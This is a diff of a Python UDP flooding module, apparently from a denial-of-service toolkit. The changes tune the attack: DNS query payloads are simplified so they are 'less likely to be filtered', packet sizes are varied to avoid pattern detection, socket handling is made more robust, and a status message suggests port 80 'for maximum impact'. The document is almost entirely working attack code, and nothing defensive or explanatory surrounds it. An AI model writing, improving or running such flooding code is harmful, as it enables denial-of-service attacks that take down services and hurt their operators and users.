@@ -17,6 +17,7 @@ logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
 )
 
+
 class UDPFlooder(AttackModule):
     def __init__(self, targets: List[str], ports: List[int], duration: int = 60, 
                  threads: int = 5, debug: bool = False, proxy_manager=None, skip_prompt: bool = False):
@@ -80,6 +81,15 @@ class UDPFlooder(AttackModule):
             "highest_mbps": 0
         }
         
+        # Initialize stats dictionary with thread-safe lock
+        self.stats = {
+            "packets_sent": 0,
+            "bytes_sent": 0,
+            "successful": 0, 
+            "failures": 0
+        }
+        self.stats_lock = threading.Lock()
+        
         # Initialize payload pool
         self.initialize_payload_pool()
         
@@ -93,6 +103,11 @@ class UDPFlooder(AttackModule):
             rate=100
         ))
         
+    def increment_stat(self, stat_name: str, value: int = 1):
+        """Thread-safe increment of stats"""
+        with self.stats_lock:
+            self.stats[stat_name] += value
+            
     def initialize_payload_pool(self):
         """Pre-generate payload patterns for various ports and sizes"""
         UI.print_info("Initializing optimized payload pool...")
@@ -100,33 +115,31 @@ class UDPFlooder(AttackModule):
         # For each port type, generate pattern templates
         self.payload_templates = {}
         
-        # DNS payload templates (port 53)
+        # DNS payload templates (port 53) - SIMPLIFIED for better effectiveness
         self.payload_templates[53] = []
-        for _ in range(20):  # Increased from 10 to 20 different DNS query templates
+        
+        # Create simpler, more effective DNS query templates
+        for _ in range(10):
+            # Standard query with recursion desired
             transaction_id = random.randint(0, 65535)
-            flags = random.choice([0x0100, 0x8000, 0x8180, 0x8580])
-            qdcount = random.randint(1, 5)  # Increased max queries
-            ancount = random.randint(0, 3)  # Increased max answers
-            nscount = random.randint(0, 3)  # Increased max name servers
-            arcount = random.randint(0, 3)  # Increased max additional records
+            flags = 0x0100  # Standard query with recursion desired
             
-            # Create the DNS header
+            # Create the DNS header - simpler structure
             header = struct.pack('!HHHHHH',
-                transaction_id,
-                flags,
-                qdcount,
-                ancount,
-                nscount,
-                arcount
+                transaction_id,  # Transaction ID
+                flags,           # Flags
+                1,               # Questions count (just 1)
+                0,               # Answer count
+                0,               # Authority count
+                0                # Additional count
             )
             
-            # Generate a domain template with more randomness
-            domain_template = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789-', k=12)) + '.' + random.choice(self.dns_domains)
-            
+            # Add to templates with common query types that are less likely to be filtered
             self.payload_templates[53].append({
                 'header': header,
-                'domain_template': domain_template,
-                'qdcount': qdcount
+                'domain_template': 'abcdefgh.' + random.choice(self.dns_domains),
+                'qdcount': 1,
+                'qtype': 1  # A record (IPv4 address) - most common and least likely to be filtered
             })
         
         # Generate generic payload patterns for other ports with more variety
@@ -157,7 +170,7 @@ class UDPFlooder(AttackModule):
                 http_methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS']
                 http_method = random.choice(http_methods)
                 http_path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
-                http_host = random.choice(['example.com', 'google.com', 'cloudflare.com', 'akamai.net'])
+                http_host = random.choice(['google.com', 'cloudflare.com', 'akamai.net'])
                 http_req = f"{http_method} {http_path} HTTP/1.1\r\nHost: {http_host}\r\n\r\n".encode()
                 
                 # Pad to desired size
@@ -174,32 +187,28 @@ class UDPFlooder(AttackModule):
             if size > self.packet_size:
                 size = self.packet_size
         
-        # For DNS port, generate specialized DNS query
+        # For DNS port, generate simplified DNS query
         if port == 53:
             template = random.choice(self.payload_templates[53])
             header = template['header']
             
             # Generate a unique subdomain
-            prefix = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))
+            prefix = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
             domain = template['domain_template'].replace('abcdefgh', prefix)
             
-            # Build question section with multiple queries
-            questions = b''
-            for _ in range(template['qdcount']):
-                question = b''
-                parts = domain.split('.')
-                for part in parts:
-                    encoded_part = part.encode('ascii')
-                    question += struct.pack('B', len(encoded_part)) + encoded_part
-                question += b'\x00'
-                
-                # Randomize query types for variety
-                qtype = random.choice([1, 28, 33, 255])
-                question += struct.pack('!HH', qtype, 1)  # QTYPE and QCLASS
-                questions += question
+            # Build question section (simpler)
+            question = b''
+            parts = domain.split('.')
+            for part in parts:
+                encoded_part = part.encode('ascii')
+                question += struct.pack('B', len(encoded_part)) + encoded_part
+            question += b'\x00'  # Null terminator
             
-            # Combine header and questions
-            dns_query = header + questions
+            # Use A record query (type 1) - most common and least likely to be filtered
+            question += struct.pack('!HH', template['qtype'], 1)  # Type A, Class IN
+            
+            # Combine header and question
+            dns_query = header + question
             
             # Add padding with random data to reach desired size
             if len(dns_query) < size:
@@ -215,7 +224,11 @@ class UDPFlooder(AttackModule):
             closest_size = min(self.precomputed_payload_sizes, key=lambda x: abs(x - size))
             
             # Get a random pattern of that size
-            pattern = random.choice(self.payload_patterns[closest_size])
+            if closest_size in self.payload_patterns and self.payload_patterns[closest_size]:
+                pattern = random.choice(self.payload_patterns[closest_size])
+            else:
+                # Fallback if no pattern exists
+                pattern = random.randbytes(closest_size)
             
             # If exact size match, return as is
             if len(pattern) == size:
@@ -228,45 +241,43 @@ class UDPFlooder(AttackModule):
                 padding = random.randbytes(size - len(pattern))
                 return pattern + padding
     
+    def create_socket(self):
+        """Create a UDP socket with optimized settings"""
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            # Set larger buffer sizes for higher throughput
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16 * 1024 * 1024)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 16 * 1024 * 1024)
+            
+            # Try to set priority, but don't fail if not root
+            try:
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_PRIORITY, 7)
+            except (PermissionError, AttributeError):
+                if self.debug:
+                    self.logger.debug("Cannot set socket priority - requires root privileges")
+            
+            # Address reuse and port reuse
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            if hasattr(socket, 'SO_REUSEPORT'):  # Linux systems
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
+            
+            # For performance, set non-blocking mode
+            sock.setblocking(False)
+            
+            return sock
+        except Exception as e:
+            self.logger.error(f"Socket creation error: {e}")
+            raise
+    
     def get_socket(self, target, port, pool_index=0):
         """Get or create a socket for the target:port combination from specified pool"""
         key = f"{target}:{port}"
         
         with self.socket_pool_locks[pool_index]:
             if key not in self.socket_pools[pool_index]:
-                with self.create_socket() as sock:
-                    # Enhanced socket configuration with larger buffer sizes
-                    try:
-                        # Set larger buffer sizes for higher throughput
-                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16 * 1024 * 1024)
-                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 16 * 1024 * 1024)
-                        
-                        # Try to set priority, but don't fail if not root
-                        try:
-                            sock.setsockopt(socket.SOL_SOCKET, socket.SO_PRIORITY, 7)
-                        except PermissionError:
-                            if self.debug:
-                                self.logger.debug("Cannot set socket priority - requires root privileges")
-                        
-                        # Address reuse and port reuse
-                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                        if hasattr(socket, 'SO_REUSEPORT'):  # Linux systems
-                            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
-                        
-                        # Try to disable UDP checksum, but don't fail if not supported
-                        if hasattr(socket, 'UDP_CHECKSUM_COVERAGE'):  # Linux systems
-                            try:
-                                sock.setsockopt(socket.SOL_UDP, socket.UDP_CHECKSUM_COVERAGE, 0)
-                            except (PermissionError, AttributeError):
-                                if self.debug:
-                                    self.logger.debug("Cannot disable UDP checksum - requires root privileges")
-                        
-                        # For performance, set non-blocking mode
-                        sock.setblocking(False)
-                    except Exception as e:
-                        self.logger.debug(f"Socket option error: {e}")
-                        raise
-                
+                try:
+                    sock = self.create_socket()
+                    
                     # If using proxies, try to bind to a proxy
                     if self.proxy_manager:
                         proxy = self.proxy_manager.get_proxy()
@@ -280,15 +291,15 @@ class UDPFlooder(AttackModule):
                                 if self.debug:
                                     UI.print_error(f"Failed to use proxy {proxy}: {e}")
                     
-                    # For DNS ports, try to use random source ports (if running as root)
-                    if port == 53:
-                        try:
-                            if os.geteuid() == 0:  # Running as root
-                                random_port = random.randint(1024, 65000)
-                                sock.bind(('0.0.0.0', random_port))
-                        except (AttributeError, OSError):
-                            pass
+                    # REMOVED: DNS-specific source port binding that was causing issues
+                    # This was potentially causing issues with DNS flooding
                     
+                    self.socket_pools[pool_index][key] = sock
+                except Exception as e:
+                    self.logger.error(f"Failed to create socket for {target}:{port}: {e}")
+                    # Create a basic socket as fallback
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    sock.setblocking(False)
                     self.socket_pools[pool_index][key] = sock
             
             return self.socket_pools[pool_index][key]
@@ -296,37 +307,42 @@ class UDPFlooder(AttackModule):
     def flood_target(self, target: str, port: int):
         """Worker function that sends UDP packets with optimized performance"""
         self.logger.debug(f"Starting flood worker for {target}:{port}")
+        
         # Create multiple sockets for this worker
-        sockets = [self.get_socket(target, port, i % self.sockets_per_thread) for i in range(self.sockets_per_thread)]
+        sockets = []
+        for i in range(self.sockets_per_thread):
+            try:
+                sock = self.get_socket(target, port, i % self.sockets_per_thread)
+                sockets.append(sock)
+            except Exception as e:
+                self.logger.error(f"Error creating socket {i}: {e}")
+                # Create a basic socket as fallback
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.setblocking(False)
+                sockets.append(sock)
         
         # Pre-generate larger payload cache with varied sizes for unpredictability
         payloads = []
         for _ in range(self.packet_cache_size):
             # Vary packet sizes to avoid pattern detection
             size = random.choice(self.precomputed_payload_sizes)
+            if size > self.packet_size:
+                size = self.packet_size
             payloads.append(self.get_optimized_payload(port, size))
         
         payload_index = 0
-        
-        # Calculate burst parameters based on target bandwidth
-        target_pps = self.target_bandwidth / self.packet_size
-        packets_per_burst = min(self.burst_size, max(1000, int(target_pps * 0.5)))  # Increased from 0.2
-        
-        # Adaptive timing parameters
-        last_burst_time = time.time()
         socket_index = 0
         success_count = 0
         failure_count = 0
         
         # Batch sending setup - increased for higher throughput
         max_batch_size = 256  # Increased from 128
-        current_batch = 0
         
         # For DNS attacks, we want different subdomains each time
         if port == 53:
             dns_refresh_counter = 0
-        
-        last_packet_time = time.time() - 0.1  # Start with a slight offset to send immediately
+            # For DNS, use smaller batches to avoid overwhelming filters
+            max_batch_size = 128
         
         while self.running:
             try:
@@ -345,22 +361,44 @@ class UDPFlooder(AttackModule):
                         self.increment_stat("packets_sent")
                         self.increment_stat("bytes_sent", len(payload))
                         self.increment_stat("successful")
-                    except (socket.error, OSError):
+                    except (socket.error, OSError, BlockingIOError) as e:
                         failure_count += 1
                         self.increment_stat("failures")
                         
-                        # Recreate socket on failure
-                        try:
-                            sockets[socket_index] = self.get_socket(target, port, socket_index % self.sockets_per_thread)
-                        except:
-                            pass
+                        # Only recreate socket on serious errors, not just EAGAIN/EWOULDBLOCK
+                        if isinstance(e, BlockingIOError) and e.errno in (11, 35):  # EAGAIN or EWOULDBLOCK
+                            pass  # These are normal for non-blocking sockets
+                        else:
+                            # Recreate socket on failure
+                            try:
+                                new_sock = self.create_socket()
+                                sockets[socket_index] = new_sock
+                            except:
+                                # Fallback to basic socket
+                                sockets[socket_index] = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                                sockets[socket_index].setblocking(False)
                 
                 # Minimal sleep between batches to prevent CPU overload
                 time.sleep(0.0001)
+                
+                # Periodically refresh payloads for DNS to avoid caching
+                if port == 53:
+                    dns_refresh_counter += 1
+                    if dns_refresh_counter >= 100:  # Refresh more frequently for DNS
+                        dns_refresh_counter = 0
+                        # Refresh all DNS payloads more frequently
+                        for i in range(len(payloads)):
+                            if random.random() < 0.3:  # 30% chance to refresh each payload
+                                payloads[i] = self.get_optimized_payload(port, len(payloads[i]))
+                
+                # Periodically refresh some payloads for all ports to maintain randomness
+                if random.random() < 0.01:  # 1% chance each iteration
+                    idx = random.randint(0, len(payloads) - 1)
+                    payloads[idx] = self.get_optimized_payload(port, len(payloads[idx]))
                     
             except Exception as e:
                 if self.debug:
-                    UI.print_error(f"Error in flood_target: {str(e)}")
+                    self.logger.error(f"Error in flood_target: {str(e)}")
                 time.sleep(0.0005)  # Reduced sleep time on error
         
         # Cleanup
@@ -387,20 +425,8 @@ class UDPFlooder(AttackModule):
         
         # Special handling for DNS ports
         if 53 in self.ports:
-            UI.print_info("DNS port (53) detected - Using enhanced DNS attack techniques")
-            
-            # Check if running as root/admin for raw socket access
-            try:
-                is_root = os.geteuid() == 0
-            except AttributeError:
-                # Windows or other OS without geteuid()
-                is_root = False
-            
-            if is_root:
-                UI.print_success("Running as root - full UDP flooding capabilities enabled")
-            else:
-                UI.print_warning("Not running as root - some DNS flooding capabilities will be limited")
-                UI.print_info("For maximum DNS flooding effectiveness, run with sudo")
+            UI.print_info("DNS port (53) detected - Using simplified DNS attack techniques")
+            UI.print_info("Note: DNS traffic is often filtered. For maximum impact, consider using port 80 instead.")
         
         # Show estimated packet rate based on threads
         est_pps = self.threads * len(self.targets) * len(self.ports) * 100  # Estimate 100 pps per thread
@@ -429,7 +455,7 @@ class UDPFlooder(AttackModule):
         
         # Start only the performance monitoring thread
         perf_thread = threading.Thread(target=self.monitor_performance)
-        perf_thread.daemon = False  # Changed to non-daemon
+        perf_thread.daemon = True
         perf_thread.start()
         
         # Run for specified duration
@@ -454,23 +480,14 @@ class UDPFlooder(AttackModule):
         print(f"- Total data sent: {self.stats['bytes_sent'] / (1024*1024):.2f} MB")
         print(f"- Average speed: {mbps:.2f} Mbps ({pps:.0f} packets/sec)")
         print(f"- Peak performance: {self.perf_data['highest_mbps']:.2f} Mbps ({self.perf_data['highest_pps']:.0f} packets/sec)")
-    
-    @contextmanager
-    def create_socket(self):
-        """Context manager to create and cleanup UDP sockets"""
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        try:
-            yield sock
-        finally:
-            try:
-                sock.close()
-            except:
-                pass
 
     def monitor_performance(self):
-        """Monitor and display performance metrics"""
+        """Monitor and display performance metrics with port-specific information"""
         last_update = time.time()
         last_stats = self.stats.copy()
+        
+        # Track port-specific stats
+        port_stats = {port: {"sent": 0, "success": 0} for port in self.ports}
         
         while self.running:
             try:
@@ -501,10 +518,15 @@ class UDPFlooder(AttackModule):
                     timestamp = time.strftime("%H:%M:%S", time.localtime())
                     for target in self.targets:
                         for port in self.ports:
+                            # Add port-specific information for DNS
+                            port_info = ""
+                            if port == 53:
+                                port_info = " [DNS]"
+                            
                             status_line = self.status_format.format(
                                 timestamp=timestamp,
                                 target=target,
-                                port=port,
+                                port=f"{port}{port_info}",
                                 pps=pps,
                                 mbps=mbps,
                                 rate=success_rate
@@ -519,6 +541,7 @@ class UDPFlooder(AttackModule):
                 if self.debug:
                     self.logger.error(f"Error in performance monitoring: {e}")
                 time.sleep(1)
+
 
 class TCPFlooder(AttackModule):
     def __init__(self, targets: List[str], ports: List[int], duration: int = 60,
